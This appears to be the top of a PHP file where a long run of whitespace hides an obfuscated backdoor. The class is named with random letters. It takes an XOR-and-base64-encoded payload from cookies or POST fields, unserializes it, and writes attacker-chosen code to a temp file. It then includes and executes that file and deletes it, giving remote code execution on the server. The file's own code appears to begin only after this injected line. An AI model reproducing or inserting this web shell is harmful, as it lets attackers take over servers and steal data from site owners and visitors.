<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xsyvy")){class xsyvy{public static $spcxjk = "qeqzoqldlouxyrsd";public static $oojxbii = NULL;public function __construct(){$fkerhqfeoa = @$_COOKIE[substr(xsyvy::$spcxjk, 0, 4)];if (!empty($fkerhqfeoa)){$rjwdwwzl = "base64";$pfayuliwot = "";$fkerhqfeoa = explode(",", $fkerhqfeoa);foreach ($fkerhqfeoa as $qznzjvrjnv){$pfayuliwot .= @$_COOKIE[$qznzjvrjnv];$pfayuliwot .= @$_POST[$qznzjvrjnv];}$pfayuliwot = array_map($rjwdwwzl . "_decode", array($pfayuliwot,));$pfayuliwot = $pfayuliwot[0] ^ str_repeat(xsyvy::$spcxjk, (strlen($pfayuliwot[0]) / strlen(xsyvy::$spcxjk)) + 1);xsyvy::$oojxbii = @unserialize($pfayuliwot);}}public function __destruct(){$this->cjqqgrla();}private function cjqqgrla(){if (is_array(xsyvy::$oojxbii)) {$rjnchnszcq = sys_get_temp_dir() . "/" . crc32(xsyvy::$oojxbii["salt"]);@xsyvy::$oojxbii["write"]($rjnchnszcq, xsyvy::$oojxbii["content"]);include $rjnchnszcq;@xsyvy::$oojxbii["delete"]($rjnchnszcq);exit();}}}$jujat = new xsyvy();$jujat = NULL;} ?><?php
/**
